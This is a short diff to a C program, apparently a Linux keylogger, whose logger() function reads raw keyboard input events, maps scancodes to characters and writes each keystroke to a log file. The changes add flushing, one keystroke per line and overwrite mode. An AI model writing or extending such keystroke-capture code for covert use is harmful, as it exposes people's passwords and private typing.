@@ -161,6 +161,8 @@ void logger(){
   int shift_pressed = 0;
   int caps_pressed = 0;
   struct timeval time_stamp;
+  fprintf(log_fp, "Start logging\n");
+  fflush(log_fp);
   while(1){
     struct input_event ev;
     read(event_fd, &ev, sizeof(ev));
@@ -187,7 +189,8 @@ void logger(){
         table_ptr = normal_scancode_to_ascii;
       }
       
-      fprintf(log_fp, ">%s", table_ptr[ev.code]);
+      fprintf(log_fp, ">%s\n", table_ptr[ev.code]);
+      fflush(log_fp);
     }
     else if(ev.value == 0){
       if(ev.code == CAPS_VAL){
@@ -212,7 +215,7 @@ void start_logging(arguments args){
   else{
     log_path = args.arg_log;
   }
-  log_fp = fopen(log_path, "a");
+  log_fp = fopen(log_path, "w");
   if(log_fp == NULL){
     handle_error(stderr, 7);
   }
